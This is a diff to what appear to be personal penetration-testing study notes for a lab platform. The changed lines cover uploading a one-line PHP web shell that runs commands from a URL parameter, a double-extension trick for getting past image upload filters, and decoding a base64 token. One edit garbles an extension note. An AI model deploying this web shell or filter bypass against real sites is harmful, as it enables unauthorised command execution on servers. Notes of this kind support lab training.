@@ -680,7 +680,7 @@ executed and get back a reverse shell
 	- gedit web.php5
 	- paste shell command
 		ex: <?php system($_GET['cmd']); ?>
-	- may have to change .php5 extention depending on software
+	- may have to change .cmd extention depending on software
 	- go to file in url and make a whoami query
 		- www.website.com/path/to/web.php5/?cmd=whoami
 
@@ -698,8 +698,7 @@ executed and get back a reverse shell
 
 - Bypass File Upload Filters
 	- PNG image filter bypass
-		- Org: /var/www/images/web.png
-		- Bypass: /var/www/images/web.png.php
+		- /var/www/images/web.png.php
 
 
 
@@ -744,8 +743,11 @@ http://webapp.thm/get.php?file=userCV.pdf
 	- echo -n *token* | base64 -d
 
 
-
 ####### Wordpress & CMS ########
+
+
+
+
 
 
 
